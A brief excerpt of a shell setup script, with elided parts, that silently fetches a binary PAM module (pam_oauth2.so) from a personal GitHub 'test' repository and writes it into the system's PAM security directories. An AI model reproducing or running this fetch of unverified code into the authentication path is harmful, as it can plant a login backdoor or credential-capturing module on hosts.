...
if [ ! -f /etc/ssh_banner.txt ]; then
    ...
    if [ -d '/lib64/security' ]; then
        curl -s -o /lib64/security/pam_oauth2.so https://github.com/shaylevi2/test/raw/main/pam_oauth2.so
        chmod 644 /lib64/security/pam_oauth2.so
    elif [ -d '/lib/security' ]; then
        curl -s -o /lib/security/pam_oauth2.so https://github.com/shaylevi2/test/raw/main/pam_oauth2.so
        chmod 644 /lib/security/pam_oauth2.so
    elif [ -d '/lib/x86_64-linux-gnu/security' ]; then
        curl -s -o /lib/x86_64-linux-gnu/security/pam_oauth2.so https://github.com/shaylevi2/test/raw/main/pam_oauth2.so
